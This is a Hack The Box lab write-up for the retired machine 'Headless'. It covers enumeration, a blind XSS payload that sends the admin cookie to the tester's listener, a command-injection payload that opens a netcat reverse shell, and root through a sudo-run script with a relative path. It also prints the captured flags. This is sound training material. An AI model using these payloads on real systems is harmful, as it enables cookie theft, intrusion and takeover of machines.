---
layout: writeup
name: "headless"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
date: 2025-11-12
pwned: true
---
# Hack The Box - Headless (10.10.11.8)

## 🧠 Summary

**Headless** is an easy Linux machine hosted on Hack The Box. It demonstrates practical exploitation via:
- Blind XSS using the **User-Agent** header
- Admin cookie theft and dashboard access
- Command injection for reverse shell
- Privilege escalation through misconfigured sudo + script path abuse

---

## 🔍 Enumeration

### 🔹 Nmap

```bash
nmap -p- headless.htb --min-rate 5000
nmap -p 5000,22 -sC -sV headless.htb -oN nmap_alert
```

**Findings:**
- Port 5000: Werkzeug server (Python)
- Port 22: OpenSSH 9.2p1

---

## 🌐 Web Analysis

- Site displays “coming soon” message at `/`
- `/support` contact form present
- Submission with `<script>` triggers WAF-style "hacking attempt" warning

---

## 🚪 Gobuster Discovery

While testing XSS in the form, run Gobuster in background to enumerate paths:

```bash
gobuster dir -u http://headless.htb:5000 -w /usr/share/wordlists/dirb/big.txt
```

**Discovery:**
```
/dashboard            (Status: 500)
```

---

## 🧪 Blind XSS via User-Agent

### Step 1: Test XSS

```bash
User-Agent: <script>alert(1)</script>
```

### Step 2: Trigger data exfil

```js
<script>
var ink=new Image(); 
ink.src="http://10.10.14.12:4444/?cookie="+btoa(document.cookie);
</script>
```

### Step 3: Listener

```bash
nc -lvnp 4444
```

### Output:

```
GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=
```

Decode:

```bash
echo "aXNf..." | base64 -d
# is_admin=...
```

---

## 🔑 Cookie Theft & Dashboard Access

- Paste stolen cookie via dev tools > Storage > Cookies
- Reload `/dashboard` — now accessible

---

## 💥 Command Injection → Reverse Shell

### Payload:

```bash
date=2023-09-15;nc 10.10.14.12 1334 -e /bin/bash
```

### Listener:

```bash
nc -lvnp 1334
```

### Stabilize shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
ctrl+Z
stty raw -echo; fg; reset
```

---

## 🏁 User Flag

```bash
cat /home/dvir/user.txt
98199ec69a2d999bffd3147052096f35
```

---

## ⬆️ Privilege Escalation

### `sudo -l` Output:

```bash
(ALL) NOPASSWD: /usr/bin/syscheck
```

### Read syscheck script:

```bash
cat /usr/bin/syscheck
```

### Exploit via missing `initdb.sh`:

```bash
echo -e '#!/bin/bash\n/bin/bash' > /tmp/initdb.sh
chmod +x /tmp/initdb.sh
cd /tmp
sudo syscheck
```

### Now root!

```bash
whoami
root
cat /root/root.txt
bd2d4eb12d06b81cc888cef32e370f68
```

---

## 🧠 Lessons Learned

- XSS in headers can be powerful for stealing cookies
- `sudo -l` is crucial post-exploitation
- Poor script hygiene (like `./initdb.sh`) leads to easy root
- Gobuster helps uncover hidden paths like `/dashboard`

---

*Writeup by [inksec](https://github.com/inkedqt)*
